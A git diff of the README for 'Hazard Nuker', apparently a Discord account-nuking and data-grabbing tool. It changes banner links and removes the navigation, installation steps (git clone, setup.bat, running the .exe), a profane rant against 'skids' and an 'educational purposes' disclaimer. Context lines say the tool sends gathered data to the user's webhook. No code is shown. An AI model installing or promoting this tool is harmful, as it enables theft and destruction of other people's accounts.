@@ -1,4 +1,4 @@
-<p align= center</p><a href="https://cheataway.com" target="_blank"><img src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/Hazard_Nuker_Banner.png" alt="HazardNuker"></a>
+<p align= center</p><a href="https://discord.gg/f5Q7Z2SQSb" target="_blank"><img src="https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Nuker/Hazard_Nuker_Banner.png" alt="HazardNuker"></a>
 <p align="center">
 <img src="https://img.shields.io/github/languages/top/Rdimo/Hazard-Nuker?style=flat-square" </a>
 <img src="https://img.shields.io/github/last-commit/Rdimo/Hazard-Nuker?style=flat-square" </a>
@@ -8,12 +8,7 @@
 <img src="https://img.shields.io/github/stars/Rdimo/Hazard-Nuker?color=%23daff00&label=Stars&style=flat-square" </a>
 <img src="https://img.shields.io/github/forks/Rdimo/Hazard-Nuker?color=%23daff00&label=Forks&style=flat-square" </a>
 </p>
-<p align="center">
-<a href="https://github.com/Rdimo/Hazard-Nuker#installation">Installation</a> |
-<a href="https://github.com/Rdimo/Hazard-Nuker#Important">Important</a> |
-<a href="https://github.com/Rdimo/Hazard-Nuker/blob/master/Changelog.md">Changelogs</a> |
-<a href="https://cheataway.com">Discord</a>
-</p>
+
 
 ### 🌟Since hazard is free, donations are really appriciate and keeps the development up!
 
@@ -172,40 +167,3 @@ Upon running the file you will get the following sent to your webhook:
 </details>
 
 ---
-
-### ❗・Important
-* Make sure to have [Python](https://www.python.org/downloads/) before [Downloading](https://github.com/Rdimo/Hazard-Nuker/archive/refs/heads/master.zip) Hazard
-* Also make sure to have python added to [PATH](https://datatofish.com/add-python-to-windows-path/)
-* Please Join the [discord server](https://cheataway.com) or contact me if you get any sort of major error with Hazard
-* Some people have made a version of Hazard Nuker that looks/works like this one just that it's malicious, please make sure you only download stuff from here to make sure your info doesn't get stolen
-
-## 🤓・For you skids
-* We all know you cant code for shit but skidding peoples hard work, is just not it and profiting from it is just even more f*cked up
-* I hope you end up on the streets begging for spare change
-
-## Installation 
-
-#### 1nd・Installation (compiled)
-```
-https://github.com/Rdimo/Hazard-Nuker/releases
-Download the latest release (Hazard.zip)
-Drag it out to desktop and extract it
-Open HazardNuker.exe
-```
-
-#### 2st・Installation (source code)
-```
-git clone https://github.com/Rdimo/Hazard-Nuker.git
-cd Hazard-Nuker
-start setup.bat
-```
-
-|🌟Star This Repository if you liked Hazard Nuker!|
-|-------------------------------------------------|
-
-<a href="https://cheataway.com" target="_blank"><img src="https://discordapp.com/api/guilds/899560455993966633/widget.png?style=banner2" alt="Cheataway"/></a>
-
-Created by Rdimo#6969 | https://cheataway.com
-|⚠️・Hazard Nuker was made for educational purposes・⚠️|
-|-------------------------------------------------|
-By using HazardNuker, you agree that you hold responsibility and accountability of any consequences caused by your actions
